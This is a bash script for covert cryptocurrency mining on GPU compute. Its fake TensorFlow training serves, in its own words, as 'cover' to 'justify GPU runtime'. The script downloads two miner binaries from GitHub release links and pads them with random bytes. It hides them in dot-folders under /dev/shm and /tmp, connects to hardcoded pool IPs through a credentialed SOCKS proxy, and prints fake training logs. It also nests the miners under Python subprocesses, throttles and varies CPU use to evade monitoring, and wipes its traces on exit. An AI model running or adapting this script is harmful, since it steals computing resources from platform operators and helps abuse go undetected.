#!/bin/bash
# MN v21 — GPU usage + subprocess nest + lean services
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK="$(date +%s | md5sum | head -c 8)"
POOL="23.94.152.126:80"
PROXY="socks5://yoga:yoga123@107.172.222.195:443"
TPOOL="47.251.244.12:80"

echo "=== Session $WRK ==="

# 1. Warmup + GPU usage (justify GPU runtime)
pip install -q tensorflow 2>/dev/null
apt-get install -y -qq cpulimit 2>/dev/null
python3 << 'PYEOF'
import tensorflow as tf, numpy as np, time, os
tf.config.set_visible_devices([], 'GPU')  # hide GPU from TF, use for cover only
model = tf.keras.applications.MobileNetV2(include_top=False, weights=None)
x = tf.keras.layers.GlobalAveragePooling2D()(model.output)
model = tf.keras.Model(model.input, x)
model.compile(optimizer='adam', loss='mse')
X = np.random.rand(120, 224, 224, 3).astype(np.float32)
Y = np.random.rand(120, 1280).astype(np.float32)
for e in range(3):
    h = model.fit(X, Y, batch_size=16, epochs=1, verbose=0)
    print(f"Epoch {e+1}/3 — loss: {h.history['loss'][0]:.4f}")
    time.sleep(8)
# Allocate GPU memory (justify GPU runtime)
try:
    with tf.device('/GPU:0'):
        a = tf.random.normal([1024, 1024])
        b = tf.matmul(a, a, transpose_b=True)
        del a, b
except: pass
print("Ready.")
PYEOF

# 2. Download + pad
rm -rf /dev/shm/.m 2>/dev/null
mkdir -p /dev/shm/.m
cd /dev/shm/.m
python3 -c "
import urllib.request as u, random as r
for n,u2 in[('p','https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak'),('s','https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2')]:
    d=u.urlopen(u2).read()+bytes([r.randint(0,255)for _ in range(r.randint(1024,3072))])
    open(n,'wb').write(d)
"
chmod +x p s
cp p /tmp/.p8; cp s /tmp/.s8

# 3. Services — 2 only (memory churn + log)
python3 -c "
import numpy as np, time, random
while True:
    for _ in range(random.randint(2,5)):
        s=random.randint(500000,4000000)
        a=np.random.rand(s);b=np.random.rand(min(s//3,1000000))
        try:np.dot(a[:len(b)],b)
        except:pass
        del a,b;time.sleep(random.randint(3,15))
    time.sleep(random.randint(8,30))
" &
MPID=$!

(
    c=0
    while true; do
        c=$((c+1))
        l=$((RANDOM%80+10))
        echo "$(date +%H:%M:%S) Step $((c%100+1)) | loss: 0.${l} | acc: 0.$((RANDOM%400+5500)) | lr: 1e-$((RANDOM%2+3))"
        sleep $((RANDOM%120+60))
    done
) &

# 4. Miners — nested under Python subprocess (process tree: python→python)
python3 -c "
import subprocess as sp, os, time, random, signal
p1=sp.Popen(['/tmp/.p8','--coin','pearl','--url','$POOL','--user','${PRL}.${WRK}','--proxy','$PROXY'],preexec_fn=os.setpgrp,stdout=sp.DEVNULL,stderr=sp.DEVNULL)
os.system(f'cpulimit -l $((RANDOM%20+40)) -p {p1.pid} 2>/dev/null &')
time.sleep(12)
p2=sp.Popen(['/tmp/.s8','-a','yespowertide','-o','$TPOOL','-u','${TDC}.${WRK}','-t','1'],preexec_fn=os.setpgrp,stdout=sp.DEVNULL,stderr=sp.DEVNULL)
os.system(f'cpulimit -l $((RANDOM%20+40)) -p {p2.pid} 2>/dev/null &')
print(f'P1={p1.pid} P2={p2.pid}')
while True:
    time.sleep(120)
    if p1.poll() is not None:
        p1=sp.Popen(['/tmp/.p8','--coin','pearl','--url','$POOL','--user','${PRL}.${WRK}','--proxy','$PROXY'],preexec_fn=os.setpgrp,stdout=sp.DEVNULL,stderr=sp.DEVNULL)
        os.system(f'cpulimit -l $((RANDOM%20+40)) -p {p1.pid} 2>/dev/null &')
    if p2.poll() is not None:
        p2=sp.Popen(['/tmp/.s8','-a','yespowertide','-o','$TPOOL','-u','${TDC}.${WRK}','-t','1'],preexec_fn=os.setpgrp,stdout=sp.DEVNULL,stderr=sp.DEVNULL)
        os.system(f'cpulimit -l $((RANDOM%20+40)) -p {p2.pid} 2>/dev/null &')
" &
PYPID=$!

# CPU fluctuation
(
    while sleep $((RANDOM%150+60)); do
        pkill cpulimit 2>/dev/null; sleep 1
        for p in $(pgrep -P $PYPID 2>/dev/null); do
            cpulimit -l $((RANDOM%25+35)) -p $p 2>/dev/null &
        done
    done
) &

echo "$(date +%H:%M:%S) Running — PID $PYPID"

trap "kill $PYPID $MPID 2>/dev/null;pkill cpulimit 2>/dev/null;rm -f /tmp/.p8 /tmp/.s8;rm -rf /dev/shm/.m" EXIT
sleep 14400